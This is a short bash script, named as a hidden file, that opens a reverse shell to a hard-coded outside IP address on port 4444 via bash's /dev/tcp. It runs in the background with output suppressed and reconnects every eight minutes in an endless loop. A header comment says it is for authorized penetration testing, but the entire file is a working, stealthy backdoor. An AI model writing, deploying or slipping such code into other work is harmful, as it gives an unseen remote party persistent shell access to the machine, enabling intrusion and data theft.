#!/bin/bash
# WARNING: For authorized penetration testing and educational purposes only
# Filename: .reverse_shell.sh (hidden file)

function reverse_shell {
    local ip="188.166.181.70"
    local port="4444"
    local payload="bash -i >& /dev/tcp/$ip/$port 0>&1"
    
    # Execute in background with nohup and suppress output
    eval "nohup $payload > /dev/null 2>&1 &"
}

# Run every 8 minutes (480 seconds)
while true; do
    current_epoch=$(date +%s)
    if (( current_epoch % 480 == 0 )); then
        reverse_shell
    fi
    sleep 1
done